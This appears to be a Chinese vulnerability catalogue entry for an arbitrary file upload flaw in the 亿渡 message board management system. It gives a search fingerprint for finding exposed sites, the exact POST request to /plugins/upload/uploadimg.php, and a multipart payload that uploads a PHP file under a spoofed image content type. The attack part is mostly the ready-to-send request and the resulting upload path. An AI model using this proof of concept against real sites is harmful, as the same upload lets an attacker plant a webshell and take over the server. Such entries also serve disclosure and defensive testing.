# 亿渡留言管理系统uploadimg存在任意文件上传漏洞

- **系统**：亿渡留言管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/images/logo/logo140x38.png"`
- **请求**：`POST /plugins/upload/uploadimg.php?fp=upimg HTTP/1.1`
- **关键头**：`Content-Length: 197`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypvPqblfr…`　`X-Requested-With: XMLHttpRequest`　`Cookie: userid=1; PHPSESSID=ov8kb5g3n4gng3lfskbnpbch37; Hm_lvt_448f02fca78a892e6d9c5f1c5…`

**请求体 / payload**
```
------WebKitFormBoundarypvPqblfrUine6bl3
Content-Disposition: form-data; name="file"; filename="a.php"
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundarypvPqblfrUine6bl3--

上传文件位置
/upload//202404//eedo.net-d4A82.p
```

**其他**
- 亿渡留言管理系统uploadimg存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿渡留言管理系统